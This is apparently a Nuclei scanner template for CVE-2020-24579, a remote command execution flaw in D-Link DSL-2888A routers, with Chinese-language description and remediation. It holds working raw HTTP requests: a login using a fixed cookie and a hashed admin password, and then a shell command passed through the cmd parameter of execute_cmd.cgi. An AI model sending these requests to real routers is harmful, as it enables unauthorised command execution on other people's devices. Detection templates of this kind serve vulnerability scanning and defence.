id: CVE-2020-24579
info:
  name: D-Link DSL 2888a - Remote Command Execution
  author:
  - l0ne1y
  description: |-
    D-link DSL-2888A访问控制错误导致远程命令执行漏洞
    D-link DSL-2888A是中国D-link公司的一款统一服务路由器。

    D-Link DSL-2888A devices 存在授权问题漏洞，该漏洞源于网络系统或产品中缺少身份验证措施或身份验证强度不足。
  severity: high
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://www.dlink.com/
requests:
- matchers:
  - type: dsl
    condition: and
    dsl:
    - contains(body,randstr)
    - '!regex("echo.*?{{randstr}}",body)'
    - status_code == 200
  raw:
  - |
    POST / HTTP/1.1
    Host: {{Hostname}}
    Cookie: uid=6gPjT2ipmNz

    username=admin&password=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b
  - |
    GET /cgi-bin/execute_cmd.cgi?timestamp=1589333279490&cmd=cat%20{{randstr}} HTTP/1.1
    Host: {{Hostname}}
    Cookie: uid=6gPjT2ipmNz
